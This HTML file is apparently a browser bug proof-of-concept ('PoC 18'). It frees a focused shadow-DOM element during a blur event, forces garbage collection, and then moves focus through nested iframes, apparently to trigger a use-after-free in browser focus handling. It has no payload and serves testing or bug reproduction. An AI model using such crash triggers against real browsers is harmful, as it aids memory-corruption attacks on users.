<!DOCTYPE html>
<html>
<body>
<p>PoC 18 - nested iframes</p>
<div id="host"></div>
<iframe id="f1" style="width:120px;height:60px;"></iframe>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(() => {
    let doc1 = f1.contentDocument;
    doc1.body.innerHTML = '<iframe id="f2"></iframe><input id="inp">';
    let f2 = doc1.getElementById('f2');
    let doc2 = f2.contentDocument;
    doc2.body.innerHTML = '<input id="deep">';
    let deep = doc2.getElementById('deep');
    deep.focus();
    setTimeout(() => {
        doc1.getElementById('inp').focus();
        setTimeout(() => {
            window.focus();
            victim.focus();
            setTimeout(() => {
                deep.focus();
                result.textContent = 'PASS';
            }, 50);
        }, 50);
    }, 50);
}, 100);
</script>
</body>
</html>
